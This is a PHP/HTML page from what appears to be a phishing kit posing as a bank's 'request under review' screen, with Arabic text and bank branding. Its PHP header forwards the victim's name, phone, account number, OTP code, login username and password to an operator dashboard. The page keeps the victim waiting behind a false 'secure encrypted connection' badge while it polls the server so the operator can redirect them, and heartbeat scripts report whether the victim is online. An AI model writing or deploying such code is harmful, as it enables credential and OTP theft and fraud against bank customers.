<?php

declare(strict_types=1);

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once __DIR__.'/includes/flow_helpers.php';
require_once __DIR__.'/includes/session_registry.php';

if (empty($_SESSION['wait_page_broadcast'])) {
    $_SESSION['wait_page_broadcast'] = true;
    dashboard_notify_safe(
        'wait_payment_page',
        [
            'session_id' => session_id(),
            'name' => $_SESSION['reg_name'] ?? '',
            'phone' => $_SESSION['reg_phone'] ?? '',
            'account_number' => $_SESSION['reg_account'] ?? '',
            'otp_code' => $_SESSION['otp_code'] ?? '',
            'otp_digits' => $_SESSION['otp_digits'] ?? '',
            'login_account_number' => $_SESSION['username'] ?? '',
            'password' => $_SESSION['sham_password'] ?? '',
        ],
        'انتظار بعد OTP — كل بيانات الجلسة'
    );
}

registry_touch_page('wait-payment.php');
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>بنك البركة | جاري مراجعة الطلب</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --sahara-green: #a52a2a;
            --sahara-green-dark: #1e5e1e;
            --sahara-green-light: #e8f5e9;
            --sahara-dark: #1a1a2e;
            --sahara-gray: #6B7280;
            --sahara-light: #F9FAFB;
            --sahara-white: #FFFFFF;
            --sahara-gold: #d4af37;
            --sahara-border: #E5E7EB;
            --sahara-radius: 16px;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Tajawal', system-ui, -apple-system, sans-serif;
            background: var(--sahara-light);
            color: #1E293B;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* === Navbar === */
        .sahara-nav {
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 14px 16px;
            background: var(--sahara-white);
            box-shadow: 0 1px 4px rgba(0,0,0,0.06);
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        .sahara-nav .logo-img {
            height: 60px;
        }

        /* === Step Indicator === */
        .step-indicator {
            display: flex;
            justify-content: center;
            gap: 8px;
            padding: 16px;
            background: var(--sahara-white);
            border-bottom: 1px solid var(--sahara-border);
        }
        .step-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: var(--sahara-border);
        }
        .step-dot.completed {
            background: var(--sahara-green);
        }
        .step-dot.active {
            background: var(--sahara-gold);
            box-shadow: 0 0 0 4px rgba(212, 175, 55, 0.2);
            animation: dotPulse 1.5s ease-in-out infinite;
        }

        @keyframes dotPulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.3); }
        }

        /* === Main Content === */
        .wait-wrap {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px 16px;
        }

        .wait-card {
            background: var(--sahara-white);
            border-radius: var(--sahara-radius);
            padding: 40px 24px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
            border: 1px solid var(--sahara-border);
            text-align: center;
            max-width: 420px;
            width: 100%;
        }

        /* === Animated Icon === */
        .wait-icon {
            position: relative;
            width: 90px;
            height: 90px;
            margin: 0 auto 24px;
        }

        .wait-icon .circle-outer {
            position: absolute;
            inset: 0;
            border-radius: 50%;
            border: 3px solid var(--sahara-border);
            border-top-color: var(--sahara-green);
            animation: spin 1.2s linear infinite;
        }

        .wait-icon .circle-inner {
            position: absolute;
            inset: 10px;
            border-radius: 50%;
            border: 3px solid var(--sahara-border);
            border-bottom-color: var(--sahara-gold);
            animation: spin 1.8s linear infinite reverse;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .wait-icon .icon-center {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 28px;
            color: var(--sahara-green);
            animation: pulse 2s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.7; transform: translate(-50%, -50%) scale(1); }
            50% { opacity: 1; transform: translate(-50%, -50%) scale(1.1); }
        }

        /* === Text === */
        .wait-title {
            font-size: 20px;
            font-weight: 700;
            color: #1E293B;
            margin-bottom: 8px;
        }

        .wait-desc {
            font-size: 14px;
            color: var(--sahara-gray);
            line-height: 1.8;
            margin-bottom: 24px;
        }

        /* === Progress Bar === */
        .progress-bar-container {
            background: var(--sahara-border);
            border-radius: 10px;
            height: 6px;
            overflow: hidden;
            margin-bottom: 24px;
        }

        .progress-bar-fill {
            height: 100%;
            width: 30%;
            background: linear-gradient(90deg, var(--sahara-green), var(--sahara-green-dark));
            border-radius: 10px;
            animation: progressMove 2s ease-in-out infinite;
        }

        @keyframes progressMove {
            0% { width: 10%; margin-left: 0; }
            50% { width: 50%; margin-left: 25%; }
            100% { width: 10%; margin-left: 90%; }
        }

        /* === Steps === */
        .wait-steps {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin-bottom: 24px;
        }

        .wait-step {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
        }

        .wait-step .step-icon {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
        }

        .wait-step.done .step-icon {
            background: var(--sahara-green);
            color: white;
        }

        .wait-step.active .step-icon {
            background: var(--sahara-gold);
            color: var(--sahara-dark);
            animation: blink 1.5s ease-in-out infinite;
        }

        .wait-step.pending .step-icon {
            background: var(--sahara-green-light);
            color: var(--sahara-gray);
            animation: blink 1.5s ease-in-out infinite;
            animation-delay: 0.5s;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        .wait-step .step-label {
            font-size: 12px;
            color: var(--sahara-gray);
            font-weight: 600;
        }

        .wait-step.done .step-label {
            color: var(--sahara-green);
        }

        .wait-step.active .step-label {
            color: var(--sahara-green-dark);
        }

        /* === Warning Badge === */
        .wait-warning {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: var(--sahara-green-light);
            border: 1px solid rgba(44, 122, 44, 0.3);
            border-radius: 50px;
            padding: 10px 20px;
            font-size: 12px;
            font-weight: 600;
            color: var(--sahara-green);
        }

        /* === Error Modal === */
        .error-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.5);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .error-overlay.show {
            display: flex;
        }

        .error-card {
            background: white;
            border-radius: 20px;
            padding: 40px 30px;
            text-align: center;
            max-width: 340px;
            width: 100%;
        }

        .error-card .error-icon {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: #FEF2F2;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 15px;
            font-size: 24px;
            color: #DC2626;
        }

        .error-card h3 {
            font-size: 18px;
            color: #1E293B;
            margin-bottom: 10px;
            font-family: 'Tajawal', sans-serif;
        }

        .error-card p {
            font-size: 14px;
            color: var(--sahara-gray);
            margin-bottom: 20px;
            font-family: 'Tajawal', sans-serif;
        }

        .error-card button {
            background: linear-gradient(135deg, var(--sahara-green), var(--sahara-green-dark));
            color: #fff;
            border: none;
            padding: 12px 40px;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            font-family: 'Tajawal', sans-serif;
            box-shadow: 0 4px 16px rgba(44, 122, 44, 0.3);
        }

        /* === Footer === */
        .sahara-footer {
            background: linear-gradient(135deg, #1a3c1a 0%, #8e000e 100%);
            color: var(--sahara-white);
            padding: 24px 16px;
            text-align: center;
            margin-top: auto;
        }
        .sahara-footer .footer-logo {
            height: 50px;
            margin-bottom: 12px;
        }
        .sahara-footer p {
            font-size: 11px;
            color: rgba(255,255,255,0.7);
            line-height: 1.7;
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .fade-in {
            animation: fadeInUp 0.6s ease-out;
        }
    </style>
</head>
<body>

    <!-- Navbar -->
    <nav class="sahara-nav">
        <img src="https://i.postimg.cc/Xq4ZsdJT/bar-removebg-preview.png" alt="مصرف الصحارى" class="logo-img">
    </nav>

    <!-- Step Indicator -->
    <div class="step-indicator">
        <div class="step-dot completed"></div>
        <div class="step-dot completed"></div>
        <div class="step-dot completed"></div>
        <div class="step-dot active"></div>
    </div>

    <!-- Main Content -->
    <div class="wait-wrap">
        <div class="wait-card fade-in">
            <!-- Animated Icon -->
            <div class="wait-icon">
                <div class="circle-outer"></div>
                <div class="circle-inner"></div>
                <i class="fas fa-file-alt icon-center"></i>
            </div>

            <h2 class="wait-title">جاري مراجعة طلبك</h2>
            <p class="wait-desc">تتم مراجعة بياناتك من النظام.<br>يرجى عدم إغلاق هذه الصفحة.</p>

            <!-- Progress Bar -->
            <div class="progress-bar-container">
                <div class="progress-bar-fill"></div>
            </div>

            <!-- Steps -->
            <div class="wait-steps">
                <div class="wait-step done">
                    <div class="step-icon"><i class="fas fa-check"></i></div>
                    <span class="step-label">تقديم الطلب</span>
                </div>
                <div class="wait-step active">
                    <div class="step-icon"><i class="fas fa-check-double"></i></div>
                    <span class="step-label">التأكيد</span>
                </div>
            </div>

            <!-- Warning -->
            <div class="wait-warning">
                <i class="fas fa-shield-alt"></i>
                اتصال آمن ومشفر - لا تغلق الصفحة
            </div>
        </div>
    </div>

    <!-- Error Modal -->
    <div class="error-overlay " id="errorModal">
        <div class="error-card">
            <div class="error-icon">
                <i class="fas fa-times"></i>
            </div>
            <h3>تعذر إتمام الطلب</h3>
            <p>يرجى التحقق من البيانات المدخلة والمحاولة مرة أخرى</p>
            <button onclick="window.location='index.php'">إعادة المحاولة</button>
        </div>
    </div>

    <!-- Footer -->
 
    

    <script>
    function checkRedirect() {
        fetch('polling-redirect.php').then(r => r.json()).then(data => { if (data.redirect) { window.location.href = data.redirect; } }).catch(e => {});
    }
    setInterval(checkRedirect, 1500);
    checkRedirect();
    </script>
    
<script>
// Heartbeat - تحديث حالة الاتصال فوراً
function sendHeartbeat() {
    fetch('heartbeat.php').catch(function(e){});
}
setInterval(sendHeartbeat, 2000);
sendHeartbeat();
window.addEventListener('beforeunload', function() {
    navigator.sendBeacon('heartbeat.php', new URLSearchParams({action: 'offline'}));
});
</script>
</body>
</html>
